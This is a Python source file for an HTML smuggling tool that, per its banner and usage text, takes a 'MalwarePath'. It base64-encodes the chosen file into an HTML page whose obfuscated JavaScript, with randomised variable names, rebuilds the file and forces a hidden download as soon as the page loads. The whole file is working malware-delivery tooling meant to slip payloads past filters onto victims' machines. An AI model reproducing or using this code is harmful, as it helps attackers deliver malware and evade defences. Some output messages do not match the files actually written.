import random
import string
import sys
import os
import base64

try:
    from rich import print
except ImportError:
    os.system("pip install rich")

cyann = "cyan bold"
greenn = "#33ff29 bold"
mof = "#ab01ff bold"
white = "white bold"
error = "#ff1d00 bold"
bluee = "blue bold"
mof = "#CB88D8 bold"
b = "#E91377 bold"
y = "#FCF800 bold"
backg = "white on " + error
back = "#ab01ff on " + error
bk = "white bold"

def bannare():
    bannar = f"""
[bold {error}]       _  _ ___ _  _ _    ____ _  _ _  _ ____ ____ _    _ _  _ ____ 
[bold {mof}]       |__|  |  |\/| |    [__  |\/| |  | | __ | __ |    | |\ | | __ 
[bold {y}]       |  |  |  |  | |___ ___] |  | |__| |__] |__] |___ | | \| |__] 
[bold {cyann}]            created by : [bold {greenn}]Abdulrahman Mohammed [bold {y}]([bold {error}]De3vil[bold {y}])
[bold {y}]                github : [bold {greenn}] https://github.com/De3vil
[bold {y}]              repair by : [bold {greenn}]La Hadiani
[bold {cyann}]            my github : [bold {greenn}] https://github.com/lahadiyani
"""
    print(bannar)

bannare()

def r_sqs():
    # generator a random sequences
    randoms = []
    for de3vil in range(0, 19):
        while True:
            uniqu = True
            ntmp1 = random.sample(string.ascii_lowercase, k=2)
            ntmp22 = random.sample(string.digits, k=2)
            ntmp2 = random.sample(string.ascii_lowercase, k=5)
            nubTmp = ntmp1[0] + ntmp1[1] + ntmp22[0] + ntmp22[1] + ntmp2[2] + ntmp2[3] + ntmp2[3] + ntmp2[4]
            for tmp in randoms:
                if tmp == nubTmp:
                    uniqu = False
                    break
            if uniqu:
                randoms.append(nubTmp)
                break
    return randoms

def arg(outputscr):
    argv = sys.argv
    number = len(argv)
    if number == 3:
        filename = argv[1].replace('"', "")
        filepath = argv[2].replace('"', "")
    else:
        program = argv[0].split(sep='\\')[-1].split(sep='/')[-1]
        print()
        print(f"[bold white]How to use it Examples")
        print(f"[bold blue]Usage: [bold white]python {program} [bold {greenn}<FileName>] [bold {mof}<MalwarePath>] [bold {cyann}]or [bold {greenn}./{program} [bold {greenn}<FileName>] [bold {mof}<MalwarePath>]")
        print()
        sys.exit(0)

    # (0) check file and permissions
    check_file_exist = os.access(filepath, os.F_OK)  # return True OR  False
    try:
        with open(file=outputscr, encoding='utf-8', mode='w') as wfile:
            wfile.write("Trial")
        os.remove(outputscr)
        check_write_permission = True
    except:
        check_write_permission = False

    if check_file_exist:
        if check_write_permission:
            return filename, filepath
        else:
            print()
            print(f"[bold {error}]You Do not have permission to write or delete this file!")
            print()
            sys.exit(0)
    else:
        print()
        print(f"[bold {error}]The file not found [bold {filepath}]")
        print()
        sys.exit(0)

if __name__ == '__main__':
    outputscr = "script.txt"
    try:
        file_name, filepath = arg(outputscr)
    except:
        sys.exit(0)

    try:
        with open(file=filepath, mode='rb') as rbfile:
            file_bytes = rbfile.read()

        data_base64_bytes = base64.b64encode(file_bytes)
        del file_bytes, filepath

        file_base64 = data_base64_bytes.decode(encoding='UTF-8')
        del data_base64_bytes

        randoms = r_sqs()
        x = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
</head>
<body>
"""

        y = """</body>
</html>
"""

        template = x + '\n' + """<script> var """ + randoms[0] + """=""" + randoms[0] + """;(function(""" + randoms[1] + """,""" + randoms[2] + """){var """ + randoms[3] + """=""" + randoms[0] + """,""" + randoms[4] + """=""" + randoms[1] + """();while(!![]){try{var """ + randoms[5] + """=-parseInt(""" + randoms[3] + """(0x1b1))/0x1+-parseInt(""" + randoms[3] + """(0x1a7))/0x2+parseInt(""" + randoms[3] + """(0x1b3))/0x3+-parseInt(""" + randoms[3] + """(0x1bd))/0x4*(parseInt(""" + randoms[3] + """(0x1b6))/0x5)+parseInt(""" + randoms[3] + """(0x1b4))/0x6*(parseInt(""" + randoms[3] + """(0x1a8))/0x7)+parseInt(""" + randoms[3] + """(0x1b9))/0x8+-parseInt(""" + randoms[3] + """(0x1b7))/0x9;if(""" + randoms[5] + """===""" + randoms[2] + """)break;else {randoms[4]}['push']({randoms[4]}['shift']());}}}(""" + randoms[7] + """,0x291fa));function """ + randoms[7] + """(){var """ + randoms[
            8] + """=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\\x20none','click','charCodeAt','href','""" + file_name + """','96643zAJuKG'];""" + randoms[
                 7] + """=function(){return """ + randoms[8] + """;};return """ + randoms[7] + """();}var """ + randoms[
                 13] + """='""" + file_base64 + """',""" + randoms[14] + """=window[""" + randoms[0] + """(0x1bc)](""" + randoms[13] + """),""" + randoms[15] + """=new Uint8Array(""" + randoms[14] + """[""" + randoms[0] + """(0x1b8)]);for(var i=0x0;i<""" + randoms[
                 14] + """[""" + randoms[0] + """(0x1b8)];i++){""" + randoms[15] + """[i]=""" + randoms[14] + """[""" + randoms[0] + """(0x1ae)](i);}function """ + randoms[0] + """(""" + randoms[10] + """,""" + randoms[12] + """){var """ + randoms[7] + """46=""" + randoms[7] + """();return """ + randoms[0] + """=function(""" + randoms[
                 0] + """ed,""" + randoms[9] + """){""" + randoms[0] + """ed=""" + randoms[0] + """ed-0x1a7;var """ + randoms[
                          11] + """=""" + randoms[7] + """46[""" + randoms[0] + """ed];return """ + randoms[11] + """;},""" + randoms[0] + """(""" + randoms[10] + """,""" + randoms[12] + """);}var """ + randoms[16] + """=new Blob([""" + randoms[15] + """[""" + randoms[
                 0] + """(0x1aa)]],{'type':""" + randoms[0] + """(0x1b5)}),""" + randoms[17] + """=document[""" + randoms[
                 0] + """(0x1be)]('a'),""" + randoms[18] + """=window[""" + randoms[0] + """(0x1ab)]['createObjectURL'](""" + randoms[16] + """);document[""" + randoms[0] + """(0x1ba)][""" + randoms[0] + """(0x1a9)](""" + randoms[17] + """),""" + randoms[
                 17] + """['style']=""" + randoms[0] + """(0x1ac),""" + randoms[17] + """[""" + randoms[0] + """(0x1af)]=""" + randoms[18] + """,""" + randoms[17] + """[""" + randoms[0] + """(0x1bb)]=""" + randoms[0] + """(0x1b0),""" + randoms[17] + """[""" + randoms[
                 0] + """(0x1ad)](),window[""" + randoms[0] + """(0x1ab)][""" + randoms[0] + """(0x1b2)](""" + randoms[18] + """); </script>""" + '\n' + y

        del file_name, file_base64, randoms

        with open(file=outputscr, encoding='utf-8', mode="w") as wfile:
            wfile.write(template)

        with open("mido_template.html", "w", encoding="utf-8") as Midohtml:
            Midohtml.write(template)

        print()
        print(f"[bold white][bold blue] +[bold white] The [bold {error}{bk}Template.html[bold white]] file has been created [bold {greenn}successfully][/{error}{bk}]")
        print(f"[bold white][bold blue] +[bold white] Script File: [bold {error}{bk}\"jscode.txt\"[bold white]][/{error}{bk}]")
        print()

    except Exception as e:
        print(e)
        print(f"[bold {error}]An unexpected error has occurred![/{error}{bk}]")
        print()
        